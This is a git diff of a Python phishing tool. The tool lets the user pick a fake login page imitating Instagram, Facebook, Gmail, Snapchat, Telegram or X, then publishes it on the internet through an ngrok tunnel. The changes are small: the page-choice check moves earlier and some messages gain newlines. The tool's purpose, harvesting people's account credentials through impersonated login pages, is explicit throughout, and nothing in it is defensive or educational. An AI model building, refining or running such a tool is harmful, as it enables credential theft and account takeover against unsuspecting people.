@@ -3,6 +3,7 @@ from importlib import import_module as eximport
 from subprocess import run
 import os, platform, time
 
+
 def cleaar():
     if platform.system() == "Windows":
         os.system("cls") 
@@ -86,6 +87,24 @@ print(f"\n{red}More Features Are Comming Soon!\n")
 
 chhosse = input((f"{green}Enter here {byellow}(insta, meta, etc.): ")).lower()
 
+optiosn = {
+        "insta": "instagram.html",
+        "meta": "facebook.html",
+        "gmail": "gmail.html",
+        "snap": "snapchat.html",
+        "tele": "telegram.html",
+        "x": "x.html",
+    }
+
+if chhosse in optiosn:
+    pass
+
+else:
+    # abort(404)
+    # raise ValueError(f"{e} not exists this type of Phishing page!")
+    print(termcolor.colored("\nInvalid input! Please choose a valid phishing page type.", "red"))
+    exit()
+
 try:
     por = int(input(termcolor.colored("Enter port number here (Default port - 8096): ", "cyan")))
 
@@ -95,24 +114,6 @@ try:
 except:
     por = 8096
 
-
-optiosn = {
-        "insta": "instagram.html",
-        "meta": "facebook.html",
-        "gmail": "gmail.html",
-        "snap": "snapchat.html",
-        "tele": "telegram.html",
-        "x": "x.html",
-    }
-    
-if chhosse in optiosn:
-    pass
-
-else:
-    # abort(404)
-    # raise ValueError(f"{e} not exists this type of Phishing page!")
-    print(termcolor.colored("Invalid input! Please choose a valid phishing page type.", "red"))
-    exit()
 
 custom_url = input(f"\n{purple}Enter Custom Url: ")
 
@@ -147,7 +148,7 @@ if __name__ == "__main__":
             public_url = ngrok.connect(por, "http")
 
         except Exception as e:
-            print(f"{byellow}ERROR: {red}{str(e)}")
+            print(f"\n{byellow}ERROR: {red}{str(e)}")
 
         print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))
         print(termcolor.colored(f"Public URL: {public_url} \n\n", "light_green"))
